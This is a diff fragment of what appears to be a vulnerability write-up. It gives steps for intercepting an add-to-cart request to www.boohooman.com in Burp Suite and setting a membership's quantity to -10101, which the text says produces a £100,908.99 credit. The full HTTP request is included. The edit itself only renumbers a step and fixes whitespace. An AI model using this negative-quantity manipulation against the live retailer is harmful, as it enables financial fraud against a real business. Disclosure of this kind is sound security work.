@@ -49,15 +49,16 @@ A membership with `quantity: -10101` becomes a **credit of £100,908.99** applie
 
 ![premier](/premier.png)
 
-4. Intercept the request in Burp Suite:
+3. Intercept the request in Burp Suite:
+
 ```http
 POST /api/basket/addToCart?_data=routes%2F... HTTP/2
 Host: www.boohooman.com
 Content-Type: application/x-www-form-urlencoded
- 
+
 data=%7B%22items%22%3A%5B%7B%22sku%22%3A%22PREMIERMAN%22%2C%22quantity%22%3A1%2C%22algolia%22%3A%5B%5D%7D%5D%7D
 ```
- 
+
 4. In the `data` parameter, change `"quantity":1` to `"quantity":-10101`
 5. Forward the request, server returns **HTTP 200**
 
